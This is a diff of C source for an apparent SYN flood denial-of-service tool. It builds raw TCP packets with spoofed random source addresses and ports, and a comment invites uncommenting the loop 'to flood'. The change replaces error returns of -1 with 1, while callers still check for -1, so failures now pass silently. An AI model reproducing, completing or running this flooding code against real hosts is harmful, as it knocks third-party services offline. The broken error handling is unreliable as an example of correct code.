@@ -58,7 +58,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     if (socket_fd < 0)
     {
         DisplayError("Attack socket failed, %s", strerror(errno));
-        return -1;
+        return 1;
     }
     int i;
     // datagram to represent the packet
@@ -74,7 +74,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     if (!strncpy(source_ip, s->src_ip, SYN_FLOOD_IP_BUFFER_SIZE))
     {
         DisplayError("Attack strncpy failed");
-        return -1;
+        return 1;
     }
     //strcpy(source_ip, "192.168.1.1");
 
@@ -90,7 +90,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     if (!memset(datagram, 0, 4096))
     {
         DisplayError("Attack memset failed");
-        return -1;
+        return 1;
     }
 
     // Fill in the IP Header
@@ -145,7 +145,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     if (!memcpy(&psh.tcp, tcph, sizeof(struct tcphdr)))
     {
         DisplayError("Attack memcpy failed");
-        return -1;
+        return 1;
     }
 
     tcph->check = CalculateSum((unsigned short *)&psh, sizeof(struct pseudo_header));
@@ -157,7 +157,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     {
         DisplayError("Error setting IP_HDRINCL, %s", strerror(errno));
         //exit(0);
-        return -1;
+        return 1;
     }
 
     int flag = 1;
@@ -166,7 +166,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     {
         DisplayError("Error setting SO_REUSEADDR, %s", strerror(errno));
         //exit(0);
-        return -1;
+        return 1;
     }
 
     // Uncommend the loop if you want to flood :)
@@ -215,29 +215,29 @@ int SYNFloodAttack(pInput input)
     if (SplitURL(input->address, &o) == -1)
     {
         DisplayError("SYNFloodAttack SplitURL failed");
-        return -1;
+        return 1;
     }
     if (strlen(o->host) == 0 || o->port == 0)
     {
         DisplayError("SYNFloodAttack SplitURL not right");
-        return -1;
+        return 1;
     }
     // init the target ip and port
     s->dst_ip = (char *)malloc(SYN_FLOOD_IP_BUFFER_SIZE);
     if (!(s->dst_ip))
     {
         DisplayError("SYNFloodAttack malloc failed, %s", strerror(errno));
-        return -1;
+        return 1;
     }
     if (!memset(s->dst_ip, 0, SYN_FLOOD_IP_BUFFER_SIZE))
     {
         DisplayError("SYNFloodAttack memset failed, %s", strerror(errno));
-        return -1;
+        return 1;
     }
     if (!strncpy(s->dst_ip, o->host, strlen(o->host)))
     {
         DisplayError("SYNFloodAttack strncpy failed, %s", strerror(errno));
-        return -1;
+        return 1;
     }
     s->dst_port = o->port;
     FreeSplitURLBuff(o);
@@ -252,12 +252,12 @@ int SYNFloodAttack(pInput input)
             if (GetRandomIP(&(s->src_ip)) == -1)
             {
                 DisplayError("SYNFloodAttack GetRandomIP failed");
-                return -1;
+                return 1;
             }
             if (GetRandomPort(&(s->src_port)) == -1)
             {
                 DisplayError("SYNFloodAttack GetRandomPort failed");
-                return -1;
+                return 1;
             }
         }
         // here we will use the default ip address and port
@@ -266,7 +266,7 @@ int SYNFloodAttack(pInput input)
             if (!strncpy(s->src_ip, SIP_ADDRESS, strlen(SIP_ADDRESS)))
             {
                 DisplayError("SYNFloodAttack copy SIP_ADDRESS failed, %s", strerror(errno));
-                return -1;
+                return 1;
             }
             s->src_port = (int)SIP_PORT;
         }
@@ -275,7 +275,7 @@ int SYNFloodAttack(pInput input)
         if (Attack(s, input->debug_level) == -1)
         {
             DisplayError("SYNFloodAttack Attack failed");
-            return -1;
+            return 1;
         }
         FreeRandomIPBuff(s->src_ip);
     }
